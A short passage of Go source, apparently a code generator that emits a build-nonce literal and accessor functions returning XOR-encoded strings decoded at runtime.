		nonceLit.WriteString(fmt.Sprintf("0x%02x", b))
	}
	nonceLit.WriteString("}")
	src.WriteString(fmt.Sprintf("var _ = %s // build nonce\n\n", nonceLit.String()))

	// Generate accessor functions
	for name, plain := range strs {
		encoded := xorEncode(plain, key)
		src.WriteString(fmt.Sprintf("func %s() string { return Xor([]byte(\"%s\"), xorKey) }\n", name, encoded))
	}

	return src.String()
}
